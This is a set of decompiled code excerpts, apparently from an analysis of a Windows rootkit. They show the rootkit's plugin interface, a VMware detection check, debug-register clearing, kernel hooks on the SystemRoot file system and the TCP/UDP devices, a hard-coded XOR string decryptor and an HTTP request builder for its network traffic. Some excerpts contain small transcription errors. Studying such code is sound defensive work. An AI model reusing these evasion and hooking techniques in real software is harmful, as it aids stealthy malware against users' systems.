["```\nstruct PLUGIN_INTERFACE\n\n{\n\n  // Initialize plug-in\n\n  PVOID Initialize;\n\n  // Release plug-in, perform cleanup operations\n\n  PVOID Release;\n\n  // Get plug-in version information\n\n  PVOID GetVersionInfo_1;\n\n  // Get plug-in version information\n\n  PVOID GetVersionInfo_2;\n\n  // Write plug-in-specific information into tcp stream\n\n  PVOID WriteIntoTcpStream;\n\n  // Read plug-in specific information from tcp stream and parse data\n\n  PVOID ReadFromTcpStream;\n\n  // Reserved fields\n\n  PVOID Reserved_1;\n\n  PVOID Reserved_2;\n\n};\n```", "```\nmov eax, 'VMXh'\n\nmov ebx, 0\n\nmov ecx, 0Ah\n\nmov edx, 'VX'\n\nin eax, dx\n```", "```\nchar _thiscall ProtoHandler_1(STRUCT_4_4 *this, PKEVENT a1)\n\n{\n\n__writedr(0, 0); // mov dr0, 0\n\n__writedr(1u, 0); // mov dr1, 0\n\n__writedr(2u, 0); // mov dr2, 0\n\n__writedr(3ut 0); // mov dr3, 0\n\n  return _ProtoHandler(&this->struct43, a1);\n\n}\n```", "```\nNTSTATUS __stdcall SetHookOnSystemRoot(PDRIVER_OBJECT DriverObject,\n\n                                       int **HookParams)\n\n{\n\n  RtlInitUnicodeString(&DestinationString, L\"\\\\SystemRoot\");\n\n  ObjectAttributes.Length = 24;\n\n  ObjectAttributes.RootDirectory = 0;\n\n  ObjectAttributes.Attributes = 64;\n\n  ObjectAttributes.ObjectName = &DestinationString;\n\n  ObjectAttributes.SecurityDescriptor = 0;\n\n  ObjectAttributes.SecurityQualityOfService = 0;\n\n➊ NTSTATUS Status = IoCreateFile(&hSystemRoot, 0x80000000, &ObjectAttributes,\n\n                                 &IoStatusBlock, 0, 0, 3u, 1u, 1u, 0, 0, 0, 0,\n\n                                 0x100u);\n\n  if (Status < 0 )\n\n    return Status;\n\n➋ Status = ObReferenceObjectByHandle(hSystemRoot, 1u, 0, 0,\n\n                                     &SystemRootFileObject, 0);\n\n  if (Status < 0 )\n\n    return Status;\n\n➌ PDEVICE_OBJECT TargetDevice = IoGetRelatedDeviceObject(SystemRootFileObject);\n\n  if ( !_ TargetDevice )\n\n      return STATUS_UNSUCCESSFUL;\n\n  ObfReferenceObject(TargetDevice);\n\n  Status = IoCreateDevice(DriverObject, 0xCu, 0, TargetDev->DeviceType,\n\n                          TargetDevice->Characteristics, 0, &SourceDevice);\n\n  if (Status < 0 )\n\n    return Status;\n\n➍ PDEVICE_OBJECT DeviceAttachedTo = IoAttachDeviceToDeviceStack(SourceDevice,\n\n                                                                TargetDevice);\n\n  if ( ! DeviceAttachedTo )\n\n  {\n\n    IoDeleteDevice(SourceDevice);\n\n    return STATUS_UNSUCCESSFUL;\n\n  }\n\n  return STATUS_SUCCESS;\n\n}\n```", "```\nkey = (0x17, 0xFB, 0x71,0x5C) ➊\n\ndef decr_data(data):\n\n  for ix in xrange(len(data)):\n\n    data[ix] ^= key[ix % 4]\n```", "```\n   RtlInitUnicodeString(&DriverName, L\"\\\\Driver\\\\Tcpip\");\n\n   RtlInitUnicodeString(&tcp_name, L\"\\\\Device\\\\Tcp\");\n\n   RtlInitUnicodeString(&udp_name, L\"\\\\Device\\\\Udp\");\n\n➊ if (!ObReferenceObjectByName(&DriverName,64,0,0x1F01FF,\n\n                                IoDriverObjectType,0,0,&TcpipDriver))\n\n   {\n\n     DevObj = TcpipDriver->DeviceObject;\n\n  ➋ while ( DevObj )                          // iterate through DEVICE_OBJECT\n\n     {                                         // linked list\n\n       if ( !ObQueryNameString(DevObj, &Objname, 256, &v8) )\n\n       {\n\n      ➌ if ( RtlCompareUnicodeString(&tcp_name, &Objname, 1u) )\n\n         {\n\n       ➍  if ( !RtlCompareUnicodeString(&udp_name, &Objname, 1u) )\n\n           {\n\n             ObfReferenceObject(DevObj);\n\n             this->DeviceUdp = DevObj;        // Save pointer to \\Device\\Udp\n\n           }\n\n         } else\n\n         {\n\n           ObfReferenceObject(DevObj);\n\n           this->DeviceTcp = DevObj;          // Save pointer to \\Device\\Tcp\n\n         }\n\n       }\n\n       DevObj = DevObj->NextDevice;       // get pointer to next DEVICE_OBJECT\n\n                                          // in the list\n\n     }\n\n     ObfDereferenceObject(TcpipDriver);\n\n   }\n```", "```\nint __thiscall BuildHttpHeader(_BYTE *this, int a2)\n\n{\n\n➊ user_agent_idx = get_rnd() % 0x64u;\n\n  str_cpy(http_header, \"GET \");\n\n  str_cat(http_header, &v4[204 * *(_DWORD *)(v2 + 4) + 2796]);\n\n  str_cat(http_header, \" HTTP/1.0\\r\\n\");\n\n  if ( v4[2724] & 2 )\n\n  {\n\n    str_cat(http_header, \"Accept: */*\\r\\n\");\n\n    str_cat(http_header, \"Accept-Language: en-US\\r\\n\");\n\n    str_cat(http_header, \"User-Agent: \");\n\n  ➋ str_cat(http_header, user_agent_strings[user_agent_idx]);\n\n    str_cat(http_header, \"\\r\\n\");\n\n  }\n\n  str_cat(http_header, \"Host: \");\n\n  str_cat(http_header, &v4[204 * *(_DWORD *)(v2 + 4) + 2732]);\n\n  str_cat(http_header, \"\\r\\n\");\n\n  if ( v4[2724] & 2 )\n\n    str_cat(http_header, \"Connection: Keep-Alive\\r\\n\");\n\n  str_cat(http_header, \"\\r\\n\");\n\n  result = str_len(http_header);\n\n  *(_DWORD *)(v2 + 16) = result;\n\n  return result;\n\n}\n```"]